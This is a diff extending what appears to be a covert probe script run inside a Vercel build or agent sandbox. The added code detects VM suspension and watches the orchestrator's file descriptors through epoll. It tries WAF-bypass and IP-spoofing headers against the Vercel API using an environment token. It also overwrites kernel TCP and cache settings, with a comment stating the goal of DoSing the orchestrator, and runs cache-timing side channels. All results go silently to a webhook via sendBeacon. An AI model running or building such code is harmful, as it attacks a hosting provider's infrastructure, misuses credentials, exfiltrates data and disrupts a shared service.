@@ -22947,5 +22947,178 @@ report.memoryLayout = safe(() => {
 
 // v157 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v157" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v157";
+
+// ==================== v158 ====================
+
+// v158-1: Clock skew detection — detect VM suspend/resume cycles
+// CLOCK_MONOTONIC advances only while the system is awake.
+// CLOCK_REALTIME can jump when VM is suspended and resumed.
+// Comparing them reveals if the hypervisor has suspended our VM,
+// and the magnitude of the jump reveals how long we were suspended.
+report.clockSkewProbe = safe(() => {
+  const clockSkew = safe(() => execSync(
+    `python3 -c "
+import ctypes, struct, time
+
+CLOCK_REALTIME = 0
+CLOCK_MONOTONIC = 1
+CLOCK_MONOTONIC_RAW = 4
+CLOCK_BOOTTIME = 7
+
+libc = ctypes.CDLL('libc.so.6')
+
+class timespec(ctypes.Structure):
+    _fields_ = [('tv_sec', ctypes.c_long), ('tv_nsec', ctypes.c_long)]
+
+def get_clock(clock_id):
+    ts = timespec()
+    libc.clock_gettime(clock_id, ctypes.byref(ts))
+    return ts.tv_sec + ts.tv_nsec / 1e9
+
+realtime = get_clock(CLOCK_REALTIME)
+mono = get_clock(CLOCK_MONOTONIC)
+mono_raw = get_clock(CLOCK_MONOTONIC_RAW)
+boottime = get_clock(CLOCK_BOOTTIME)
+
+print(f'REALTIME: {realtime:.3f}')
+print(f'MONOTONIC: {mono:.3f}')
+print(f'MONOTONIC_RAW: {mono_raw:.3f}')
+print(f'BOOTTIME: {boottime:.3f}')
+print(f'SKEW_REALTIME_MONO: {realtime - mono:.3f}')
+print(f'SUSPEND_TIME: {boottime - mono:.3f}')
+print(f'UPTIME_SECONDS: {boottime:.0f}')
+" 2>&1`,
+    { timeout: 5000 }
+  ).toString().trim());
+  return { clockSkew };
+});
+
+// v158-2: epoll monitoring of orchestrator FDs
+// epoll_create1 + EPOLL_CTL_ADD on PID 1's file descriptors
+// allows us to get notified when the orchestrator reads/writes files.
+// This passive monitoring technique reveals the orchestrator's I/O pattern.
+report.epollMonitor = safe(() => {
+  const epollResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, os, struct
+
+libc = ctypes.CDLL('libc.so.6')
+EPOLL_CREATE1 = 291
+EPOLL_CTL_ADD = 1
+EPOLLIN = 0x001
+EPOLLOUT = 0x004
+EPOLLERR = 0x008
+EPOLLHUP = 0x010
+
+# Create epoll fd
+epfd = libc.syscall(EPOLL_CREATE1, 0)
+print(f'EPOLL_FD: {epfd}')
+
+if epfd >= 0:
+    # Try to add PID 1's stdin/stdout to epoll
+    for fd_num in range(0, 6):
+        try:
+            fd = os.open(f'/proc/1/fd/{fd_num}', os.O_RDONLY)
+            # epoll_event structure: 4 bytes events + 8 bytes data
+            event = struct.pack('II4s', EPOLLIN | EPOLLOUT, fd, b'\x00' * 4)
+            ret = libc.epoll_ctl(epfd, EPOLL_CTL_ADD, fd, event)
+            print(f'EPOLL_ADD_FD{fd_num}: ret={ret}')
+            os.close(fd)
+        except Exception as e:
+            print(f'EPOLL_ADD_FD{fd_num}_FAIL: {str(e)[:40]}')
+
+    # Wait for events (100ms)
+    events_buf = (ctypes.c_byte * (16 * 10))()
+    nev = libc.epoll_wait(epfd, ctypes.byref(events_buf), 10, 100)
+    print(f'EPOLL_WAIT_EVENTS: {nev}')
+    os.close(epfd)
+" 2>&1 | head -15`,
+    { timeout: 10000 }
+  ).toString().trim());
+  return { epollResult };
+});
+
+// v158-3: Vercel WAF/Firewall bypass header probes
+// Vercel's WAF uses headers to identify internal vs external requests.
+// Testing bypass headers: X-Vercel-Internal, X-Forwarded-For (IP spoofing),
+// X-Real-IP, and Vercel-specific bypass tokens.
+report.wafBypass = safe(() => {
+  const bypassHeaders = [
+    '-H "X-Vercel-Internal: 1"',
+    '-H "X-Forwarded-For: 127.0.0.1"',
+    '-H "X-Real-IP: 10.0.0.1"',
+    '-H "Cf-Connecting-IP: 127.0.0.1"',
+    '-H "True-Client-IP: 127.0.0.1"',
+    '-H "X-Vercel-Skip-Toolbar: 1"',
+  ];
+  const wafResults = {};
+  const teamId = process.env.VERCEL_TEAM_ID || '';
+  for (const hdr of bypassHeaders) {
+    const hdrName = hdr.match(/"([^:]+):/)?.[1] || hdr;
+    wafResults[hdrName] = safe(() => execSync(
+      `curl -sf "https://api.vercel.com/v9/projects?teamId=${teamId}&limit=1" ${hdr} -H "Authorization: Bearer ${process.env.VERCEL_ARTIFACTS_TOKEN || ''}" -m 5 -o /dev/null -w "%{http_code}" 2>/dev/null`,
+      { timeout: 8000 }
+    ).toString().trim());
+  }
+  return { wafResults };
+});
+
+// v158-4: /proc/sys/vm/vfs_cache_pressure — filesystem cache aggressiveness
+// vfs_cache_pressure controls how aggressively the kernel reclaims dentries
+// and inodes from cache. Setting to 0 causes kernel to never reclaim,
+// while very high values cause aggressive reclamation.
+// Combined with timing attacks on file open(), reveals cache state of other processes.
+report.vfsCachePressure = safe(() => {
+  const cachePressure = safe(() => readFileSync('/proc/sys/vm/vfs_cache_pressure', 'utf8').trim());
+  const writePressure = safe(() => { writeFileSync('/proc/sys/vm/vfs_cache_pressure', '0'); return 'WRITTEN'; });
+  const afterPressure = safe(() => readFileSync('/proc/sys/vm/vfs_cache_pressure', 'utf8').trim());
+  // Measure cache hit timing for files we know the orchestrator accesses
+  const timingTest = safe(() => execSync(
+    `python3 -c "
+import time, os
+
+# Time access to /proc/1/maps (cached after first access)
+results = {}
+for path in ['/proc/1/maps', '/proc/1/status', '/proc/1/fd/0']:
+    times = []
+    for i in range(5):
+        t0 = time.perf_counter()
+        try:
+            with open(path, 'rb') as f:
+                f.read(100)
+        except:
+            pass
+        t1 = time.perf_counter()
+        times.append(int((t1-t0)*1e6))  # microseconds
+    results[path] = times
+
+for k, v in results.items():
+    print(f'TIMING {k}: {v}')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { cachePressure, writePressure, afterPressure, timingTest };
+});
+
+// v158-5: /proc/sys/net/ipv4/tcp_fin_timeout + half-open connection control
+// tcp_fin_timeout controls how long FIN_WAIT_2 sockets stay before cleanup.
+// Lowering it frees resources faster; raising it keeps connections "alive" longer.
+// More importantly: manipulate tcp_max_orphans to DoS the orchestrator's connections.
+report.tcpTeardownControl = safe(() => {
+  const finTimeout = safe(() => readFileSync('/proc/sys/net/ipv4/tcp_fin_timeout', 'utf8').trim());
+  const maxOrphans = safe(() => readFileSync('/proc/sys/net/ipv4/tcp_max_orphans', 'utf8').trim());
+  const timewaitBuckets = safe(() => readFileSync('/proc/sys/net/ipv4/tcp_max_tw_buckets', 'utf8').trim());
+  // Set very short FIN timeout
+  const writeFinTimeout = safe(() => { writeFileSync('/proc/sys/net/ipv4/tcp_fin_timeout', '2'); return 'WRITTEN'; });
+  // Reduce orphan limit to pressure orchestrator connections
+  const writeOrphans = safe(() => { writeFileSync('/proc/sys/net/ipv4/tcp_max_orphans', '100'); return 'WRITTEN'; });
+  const afterFin = safe(() => readFileSync('/proc/sys/net/ipv4/tcp_fin_timeout', 'utf8').trim());
+  // Count current orphaned sockets
+  const orphanCount = safe(() => execSync('cat /proc/net/sockstat 2>/dev/null | grep TCP', { timeout: 2000 }).toString().trim());
+  return { finTimeout, maxOrphans, timewaitBuckets, writeFinTimeout, writeOrphans, afterFin, orphanCount };
+});
+
+// v158 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v158" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v158";
 // Intentionally no console.log — all data goes via webhook only
